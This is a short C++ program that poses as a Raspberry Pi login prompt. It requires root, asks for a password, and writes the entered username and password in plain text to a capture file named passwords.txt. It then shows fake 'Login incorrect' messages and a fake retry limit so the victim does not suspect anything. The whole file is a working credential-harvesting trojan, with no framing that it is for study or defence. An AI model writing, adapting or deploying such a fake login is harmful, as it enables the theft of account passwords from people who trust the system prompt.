#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/types.h>
using namespace std;

// Make a capture file and change it's permissions to 222 so everyone can write to it.
// They won't be able read or execute the file unless you set the permissions to 777.

void rootcheck();
void rootcheck() {
        int uid = getuid();

        if(uid != 0) {
                cout << "login: Cannot possibly work without effective root" << endl;
                exit(0);
        }
}

int main(int argc,char **argv) {
        rootcheck();

        ofstream file;
        string username = argv[1];
        string password;
        string fake_username_attempt;
        string fake_password_attempt;

        file.open("passwords.txt");

        if(argc < 2 || argc > 2) {
                cout << "login: Cannot possibly work without effective root" << endl;
        }

        else if(argc == 2) {
                cout << "Password: ";
                cin >> password;

                file << username << endl;
                file << password << endl;
        }

        for(int attempt = 0; attempt <= 3; attempt++) {
                cout << "\nLogin incorrect" << endl;
                cout << "raspberrypi login: ";
                cin >> fake_username_attempt;
                cout << "Password: ";
                cin >> fake_password_attempt;
        }

        cout << "\nLogin incorrect" << endl;
        cout << "Maximum number of tries exceeded (5)" << endl;

        return 0;
}
